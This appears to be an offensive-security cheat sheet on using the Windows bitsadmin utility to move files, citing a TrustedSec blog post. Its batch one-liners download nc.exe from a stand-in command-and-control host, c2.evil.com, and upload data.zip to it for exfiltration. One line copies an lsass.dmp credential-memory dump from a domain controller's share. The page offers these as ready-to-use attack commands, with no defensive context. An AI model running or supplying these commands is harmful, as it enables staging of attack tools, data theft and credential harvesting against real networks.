# BITSADMIN

## Download[^1]
* If you remove the timeout (`timeout /T 10`) , make sure to still execute `bitsadmin /complete JOB` after the job has completed.
* Advangates:
    * Can resume upon disconnection
* Disadvantes:
    * Slow
```batch
bitsadmin /create JOB & bitsadmin /addfile JOB <REMOTE_SRC> <LOCAL_DST> & bitsadmin /resume JOB & timeout /T 10 & bitsadmin /complete JOB
bitsadmin /create JOB & bitsadmin /addfile JOB <REMOTE_SRC> <LOCAL_DST> & bitsadmin /resume JOB & timeout /T 10 & bitsadmin /complete JOB
bitsadmin /create JOB & bitsadmin /addfile JOB https://c2.evil.com/nc.exe %TEMP%\nc.exe & bitsadmin /resume JOB & bitsadmin /complete JOB
bitsadmin /transfer debjob /download /priority high "\\DC01\c$\Windows\Temp\lsass.dmp" C:\Users\user\Downloads\lsass.dmp
```

## Upload
* If you remove the timeout (`timeout /T 10`) , make sure to still execute `bitsadmin /complete JOB` after the job has completed.
```batch
bitsadmin /create /upload JOB & bitsadmin /addfile JOB <REMOTE_DST> <LOCAL_SRC> & bitsadmin /resume JOB & timeout /T 10 & bitsadmin /complete JOB
bitsadmin /create /upload JOB & bitsadmin /addfile JOB https://c2.evil.com/data.zip %TEMP%\data.zip & bitsadmin /resume JOB & timeout /T 10 & bitsadmin /complete JOB
```


[^1]: [TrustedSec - BITS for Script Kiddies](https://www.trustedsec.com/blog/bits-for-script-kiddies/)
